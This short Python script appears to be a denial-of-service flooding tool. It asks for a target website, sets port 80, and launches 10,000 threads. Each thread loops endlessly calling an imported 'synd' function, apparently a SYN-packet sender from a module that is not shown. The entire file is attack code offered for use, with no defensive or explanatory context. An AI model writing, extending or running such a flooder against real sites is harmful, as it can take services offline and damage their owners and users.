from Tloop import Tloop 
from synd import syndrepo as synd

def send(site, port):
    while True:
        print(synd(port , site))
  
if __name__ == "__main__":
    site,port = input("What website? >> "),80
    thr = 10000
    Tloop(send, thr , site , port)